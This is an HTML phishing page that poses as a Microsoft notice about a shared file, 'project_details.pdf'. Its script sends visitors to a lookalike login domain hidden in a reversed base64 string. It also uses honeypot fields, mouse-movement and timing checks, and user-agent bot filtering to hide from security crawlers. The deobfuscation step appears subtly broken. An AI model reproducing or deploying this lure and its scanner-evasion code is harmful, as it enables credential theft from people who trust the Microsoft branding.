<!doctype html>
<html lang="en">
<head>
    <title>Microsoft Secured Shared File</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="robots" content="noindex, nofollow">

    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <style>
        body {
            background-color: #F3F2F1;
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
        }
        .logo-container {
            position: absolute;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            display: flex;
            align-items: center;
            justify-content: center;
            color: #4a4a4a;
        }
        .logo-container img {
            width: 24px;
            height: auto;
        }
        .logo-container .logo-text {
            font-size: 22px;
            margin-left: 5px;
            font-weight: bold;
        }
        #box {
            position: absolute;
            top: 50%;
            left: 50%;
            text-align: center;
            background-color: #fff;
            padding: 40px;
            transform: translate(-50%, -50%);
            border-radius: 16px;
            box-shadow: 10px 10px 22px 0px rgba(0,0,0,0.75);
        }
        .message {
            text-align: center;
            font-size: 24px;
        }
        .download {
            text-align: center;
            margin-top: 20px;
        }
        .spinner {
            display: none;
            margin: 20px auto;
            border: 4px solid #f3f3f3;
            border-top: 4px solid #0078d4;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .honeypot {
            display: none;
        }
        .footer {
            position: fixed;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: #4a4a4a;
            font-size: 14px;
        }
        .footer a {
            color: #0078d4;
            text-decoration: none;
        }
        .error-message {
            color: red;
            display: none;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="logo-container">
        <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft Logo">
        <div class="logo-text">Microsoft</div>
    </div>
    <div id="box">
        <div class="message">
            <p><strong>Amelia Wesley</strong><br/>Shared a secured file with you.</p>
        </div>
        <div class="download">
            <form id="downloadForm">
                <!-- Honeypot fields will be added dynamically -->
                <button type="button" id="downloadButton" class="btn btn-primary btn-lg" disabled>View <strong>project_details.pdf</strong></button>
            </form>
            <div id="spinner" class="spinner"></div>
            <div id="errorMessage" class="error-message">Please enable JavaScript and interact with the page to proceed.</div>
        </div>
    </div>
    <div class="footer">
        <a href="https://www.microsoft.com/en-us/legal/privacy-statement">Privacy Statement</a>
    </div>

    <script>
        // Anti-bot detection variables
        let isHuman = false;
        let interactionCount = 0;
        let lastMousePosition = { x: 0, y: 0 };
        let mouseMoveDistance = 0;
        const honeypotNames = [
            'field_' + Math.random().toString(36).substring(7),
            'input_' + Math.random().toString(36).substring(7)
        ];

        // Dynamically create multiple honeypot inputs
        honeypotNames.forEach(name => {
            const input = document.createElement('input');
            input.type = 'text';
            input.name = name;
            input.className = 'honeypot';
            input.value = '';
            document.getElementById('downloadForm').appendChild(input);
        });

        // Obfuscated URL
        const obfuscatedUrl = 'ZmRwLnN0YWxpZWQtdGNlam9ycC93ZWl2L2R1b2xjLmNmZGx4c2FtLm5pZ29sLy86c3B0dGg9PQ==';

        // Function to deobfuscate the URL
        function deobfuscateUrl(obfuscated) {
            try {
                let decoded = atob(obfuscated);
                let unscrambled = '';
                for (let i = decoded.length - 1; i >= 0; i--) {
                    unscrambled += decoded[i];
                }
                return unscrambled.substring(0, unscrambled.indexOf('=='));
            } catch (e) {
                console.error('Deobfuscation error:', e);
                throw new Error('Invalid URL format');
            }
        }

        // Enhanced interaction detection with mouse movement analysis
        function enableButton(event) {
            if (event.type === 'mousemove') {
                const x = event.clientX;
                const y = event.clientY;
                if (lastMousePosition.x !== 0 || lastMousePosition.y !== 0) {
                    mouseMoveDistance += Math.sqrt(
                        Math.pow(x - lastMousePosition.x, 2) + Math.pow(y - lastMousePosition.y, 2)
                    );
                }
                lastMousePosition = { x, y };
            }
            interactionCount++;
            console.log('Interaction count:', interactionCount, 'Mouse distance:', mouseMoveDistance);
            if (interactionCount >= 2 && mouseMoveDistance > 300) {
                isHuman = true;
                document.getElementById('downloadButton').disabled = false;
                document.getElementById('errorMessage').style.display = 'none';
                console.log('Button enabled');
            }
        }

        // Detect user interactions
        document.addEventListener('mousemove', enableButton);
        document.addEventListener('touchstart', enableButton);
        document.addEventListener('keydown', enableButton);

        // Timing check to detect automated rapid interactions
        let startTime = Date.now();
        function checkTiming() {
            const elapsedTime = Date.now() - startTime;
            if (elapsedTime < 1000) {
                console.log('Timing check failed:', elapsedTime);
                return false;
            }
            return true;
        }

        // Handle button click
        document.getElementById('downloadButton').addEventListener('click', function() {
            console.log('Button clicked');
            for (let name of honeypotNames) {
                if (document.querySelector(`input[name="${name}"]`).value !== '') {
                    document.getElementById('errorMessage').textContent = 'Invalid request. Please try again later.';
                    document.getElementById('errorMessage').style.display = 'block';
                    console.log('Honeypot triggered:', name);
                    return;
                }
            }

            if (!isHuman) {
                document.getElementById('errorMessage').style.display = 'block';
                console.log('Not human');
                return;
            }

            if (!checkTiming()) {
                document.getElementById('errorMessage').textContent = 'Interaction too fast. Please try again.';
                document.getElementById('errorMessage').style.display = 'block';
                console.log('Timing check failed');
                return;
            }

            document.getElementById('spinner').style.display = 'block';
            document.getElementById('downloadButton').disabled = true;

            try {
                const url = deobfuscateUrl(obfuscatedUrl);
                console.log('Redirecting to:', url);
                setTimeout(() => {
                    window.location.assign(url);
                }, 1500);
            } catch (error) {
                document.getElementById('errorMessage').textContent = 'Redirect failed. Please try again.';
                document.getElementById('errorMessage').style.display = 'block';
                document.getElementById('spinner').style.display = 'none';
                document.getElementById('downloadButton').disabled = false;
                console.error('Redirect error:', error);
            }
        });

        // Enhanced bot detection
        const userAgent = navigator.userAgent.toLowerCase();
        const botPatterns = ['bot', 'crawl', 'spider', 'googlebot', 'bingbot', 'slurp', 'headless'];
        const isBot = botPatterns.some(pattern => userAgent.includes(pattern)) ||
                      !('ontouchstart' in window) && !('onmousemove' in window);
        if (isBot) {
            document.getElementById('errorMessage').textContent = 'Access denied.';
            document.getElementById('errorMessage').style.display = 'block';
            document.getElementById('downloadButton').disabled = true;
            console.log('Bot detected:', userAgent);
        }
    </script>

    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.1/dist/umd/popper.min.js" integrity="sha384-9/reFTGAW83EW2RDu2S0VKaIzap3H66lZH81PoYlFhbGU+6BZp6G7niu735Sk7lN" crossorigin="anonymous"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js" integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV" crossorigin="anonymous"></script>
</body>
</html>
